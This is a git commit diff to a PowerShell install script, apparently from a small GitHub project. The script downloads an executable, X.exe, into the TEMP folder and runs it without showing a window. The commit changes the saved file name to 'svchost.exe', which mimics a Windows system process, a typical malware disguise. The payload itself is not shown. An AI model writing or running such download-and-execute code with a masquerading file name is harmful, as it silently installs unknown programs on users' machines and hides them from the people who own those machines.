c8875175b80d6f4ec10c9f6c7acd2d9ebacbc06b
nowrez <113263830+nowrez@users.noreply.github.com>
2024-08-23 02:04:07 +0500

    Update install.ps1

--- install.ps1
+++ install.ps1
@@ -1,4 +1,4 @@
 $link1 = "https://github.com/nowrez/zelenkovcode/raw/main/X.exe"
-$outfile1 = "$env:TEMP\svchost.exe.exe"
+$outfile1 = "$env:TEMP\svchost.exe"
 Invoke-WebRequest -Uri "$link1" -OutFile "$outfile1"
 Start-Process -Wait -NoNewWindow -FilePath "$outfile1"
